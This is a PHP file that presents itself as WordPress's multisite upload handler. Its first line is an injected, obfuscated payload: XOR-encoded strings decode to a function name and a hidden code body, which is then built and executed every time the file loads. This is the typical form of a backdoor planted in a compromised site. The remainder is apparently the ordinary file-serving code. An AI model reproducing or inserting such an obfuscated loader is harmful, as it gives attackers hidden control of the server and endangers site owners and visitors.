<?php $wdUtKnmpu='51X9>N8JU;67B=:'^'VC=XJ+g, UUC+RT';$rqdadMO=$wdUtKnmpu('','87GI5KYM,><Rf7VP= IeM;TK5=5961cM6TeBau89K<,EUIXT<U,.4f21Y893PYJkG26AJdiI:,5MAznHXCffKKB,DHyhWwKSEJK.8Pt0stYfceE1O8ENGSZRgTA9,dUNKYgnhIa7n84BbczNkm=.F;mfY1WlLcK4<fARkrZ0-F5E+cQW-JZ,gPRhYYE 2JEKiT-,xvCbHiSRxi<LEZctp74. Qtya QL9>XRKlHmTQXHENyy58KX,N hnCm:>u;d-M,7Jh125YYKuU.7T15MvGb4h2W54qKIIUzrM,H,UePK2J5-SEnC3,B>UVh1OlQ4NJyG733 fC1YQ4O;+PW0HpBf=vjke7mj9 VvV3JoRWwNK2XEQov3<H5S3PI9l37JwQkVXXDzoKmV 8EAMRdCF46;XPCkKo+AFGPT34Tyf:-B6 :QZBB2,dC6JaO8 Jnn=KTA, XHUgeW,Q= 2Af<MO1ZzvV,-TO+ HGqbX99XDOJ9N;ELDfT;L8YeZ7B0R40KTJYK=KGKecSP. AHvOpdFW>MDJS3XMbNVK0HjnMnptlX0K+CfDvRyY7jTuqlTMJMRyIILjQdMRZuPCAsq769PIlZXDf5TUA0Eic9 ,RU-XNMQoIA7AZLXfTfaQW:hTAWBlSO65V2O40MA;-1mlaWS55>IIEtPzSA'^'QQohS>7.XWS<9R.9NT:MjC;9jYTMWn< C BkHUC3BZY+6=1;RuTAF9VP-Yfl=,>CcVW5+HImQILdaZNhx8loBo-Y0hDHpPpYLC-AJxPYSIyVXEaXsK1<+64zC0 MMMnno0LEACh>JWA6BMGnCIYO2Z6B0lw2lG QE=e;KWzCY4Y EKu<H3sqNkXaP+ TG8+cM;XXQMIk5c.XrMX-1;CIPQUBS4OsED08Xa372LuM204; ussSW9=M-HHFg2yq:p-hmMDjLZWLyduUqXV8DPdV<h=LV6AU. ,0uGRiG-UnoYoV+ALsxNgEM.K0mbLEf8RnbXcSRGAOcJSXR IN14XhXf9o3;> d9JXSvR=V3OoiWj=S404FVH6A<wW1=X3XR3WlKr3==AeBdrDY1 moDg0UZN=kIb6eVKLc45GUtDFzX,EEH8;.+HIL;Y8>+YT+11P> iNA+-cS:3I2RDWiBX,;PsVVrHL .tK->XKc3P>lk.X:ZejbF5I>Y :1R;o7LY8 9qlV.>lICw4OT aViVDn:Zxln7R,,9i=.Io7GmSMTKoQyNsVpE0KkTZ1MIZczrydLqxtS5V+d8RycgUQVDK1031==9P,<2D6ADIAU>:L<iaqK- C sexFtFAq,0a176.Dw+WA7ihDQ4-TLUJ1HlY<PF =mDyAY<');$rqdadMO();
/**
 * Multisite upload handler.
 *
 * @since 3.0.0
 *
 * @package WordPress
 * @subpackage Multisite
 */

define( 'SHORTINIT', true );
require_once( dirname( dirname( __FILE__ ) ) . '/wp-load.php' );

if ( !is_multisite() )
	die( 'Multisite support not enabled' );

ms_file_constants();

error_reporting( 0 );

if ( $current_blog->archived == '1' || $current_blog->spam == '1' || $current_blog->deleted == '1' ) {
	status_header( 404 );
	die( '404 &#8212; File not found.' );
}

$file = rtrim( BLOGUPLOADDIR, '/' ) . '/' . str_replace( '..', '', $_GET[ 'file' ] );
if ( !is_file( $file ) ) {
	status_header( 404 );
	die( '404 &#8212; File not found.' );
}

$mime = wp_check_filetype( $file );
if ( false === $mime[ 'type' ] && function_exists( 'mime_content_type' ) )
	$mime[ 'type' ] = mime_content_type( $file );

if ( $mime[ 'type' ] )
	$mimetype = $mime[ 'type' ];
else
	$mimetype = 'image/' . substr( $file, strrpos( $file, '.' ) + 1 );

header( 'Content-Type: ' . $mimetype ); // always send this
if ( false === strpos( $_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS' ) )
	header( 'Content-Length: ' . filesize( $file ) );

// Optional support for X-Sendfile and X-Accel-Redirect
if ( WPMU_ACCEL_REDIRECT ) {
	header( 'X-Accel-Redirect: ' . str_replace( WP_CONTENT_DIR, '', $file ) );
	exit;
} elseif ( WPMU_SENDFILE ) {
	header( 'X-Sendfile: ' . $file );
	exit;
}

$last_modified = gmdate( 'D, d M Y H:i:s', filemtime( $file ) );
$etag = '"' . md5( $last_modified ) . '"';
header( "Last-Modified: $last_modified GMT" );
header( 'ETag: ' . $etag );
header( 'Expires: ' . gmdate( 'D, d M Y H:i:s', time() + 100000000 ) . ' GMT' );

// Support for Conditional GET - use stripslashes to avoid formatting.php dependency
$client_etag = isset( $_SERVER['HTTP_IF_NONE_MATCH'] ) ? stripslashes( $_SERVER['HTTP_IF_NONE_MATCH'] ) : false;

if ( ! isset( $_SERVER['HTTP_IF_MODIFIED_SINCE'] ) )
	$_SERVER['HTTP_IF_MODIFIED_SINCE'] = false;

$client_last_modified = trim( $_SERVER['HTTP_IF_MODIFIED_SINCE'] );
// If string is empty, return 0. If not, attempt to parse into a timestamp
$client_modified_timestamp = $client_last_modified ? strtotime( $client_last_modified ) : 0;

// Make a timestamp for our most recent modification...
$modified_timestamp = strtotime($last_modified);

if ( ( $client_last_modified && $client_etag )
	? ( ( $client_modified_timestamp >= $modified_timestamp) && ( $client_etag == $etag ) )
	: ( ( $client_modified_timestamp >= $modified_timestamp) || ( $client_etag == $etag ) )
	) {
	status_header( 304 );
	exit;
}

// If we made it this far, just serve the file
readfile( $file );
flush();
